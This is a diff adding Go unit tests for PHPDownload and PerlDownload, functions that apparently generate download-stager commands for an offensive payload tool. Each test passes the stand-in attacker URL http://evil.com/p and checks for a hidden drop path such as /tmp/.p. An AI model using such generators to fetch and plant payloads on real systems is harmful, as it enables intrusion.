@@ -79,3 +79,27 @@ func TestPythonDownload(t *testing.T) {
 		t.Errorf("PythonDownload = %q", got)
 	}
 }
+
+func TestPHPDownload(t *testing.T) {
+	got := PHPDownload("http://evil.com/p", "")
+	if !strings.Contains(got, "php") || !strings.Contains(got, "/tmp/.p") {
+		t.Errorf("PHPDownload default = %q", got)
+	}
+
+	got = PHPDownload("http://evil.com/p", "/opt/payload")
+	if !strings.Contains(got, "/opt/payload") {
+		t.Errorf("PHPDownload custom path = %q", got)
+	}
+}
+
+func TestPerlDownload(t *testing.T) {
+	got := PerlDownload("http://evil.com/p", "")
+	if !strings.Contains(got, "perl") || !strings.Contains(got, "/tmp/.p") {
+		t.Errorf("PerlDownload default = %q", got)
+	}
+
+	got = PerlDownload("http://evil.com/p", "/opt/payload")
+	if !strings.Contains(got, "/opt/payload") {
+		t.Errorf("PerlDownload custom path = %q", got)
+	}
+}
